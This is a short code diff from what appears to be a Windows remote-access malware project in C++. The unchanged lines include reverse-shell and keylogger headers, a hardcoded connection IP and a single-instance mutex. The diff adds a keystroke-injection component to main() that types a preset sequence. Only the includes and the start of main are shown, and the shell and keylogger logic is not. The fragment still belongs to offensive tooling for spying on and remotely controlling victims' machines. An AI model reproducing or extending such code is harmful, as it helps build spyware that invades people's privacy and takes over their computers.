@@ -13,6 +13,7 @@
 #include "information/network/NetworkInformation.h"
 #include "reverse_shell/ReverseShell.h"
 #include "Keylogger/KeyLogger.h"
+#include "keyboard/KeyboardExecuter.h"
 
 #define IP "192.168.1.133"
 
@@ -53,6 +54,8 @@
 
 
 int main() {
+    KeyboardExecuter keyboardExecuter("jcDelay/1000\nhola como estas\njcOrder/13\n");
+    keyboardExecuter.executeSequence();
     HANDLE hMutexHandle = CreateMutex(nullptr, TRUE, reinterpret_cast<LPCSTR>(MUTEX));
     if (!(hMutexHandle == nullptr || GetLastError() == ERROR_ALREADY_EXISTS)) {
         bool connectionState = true;
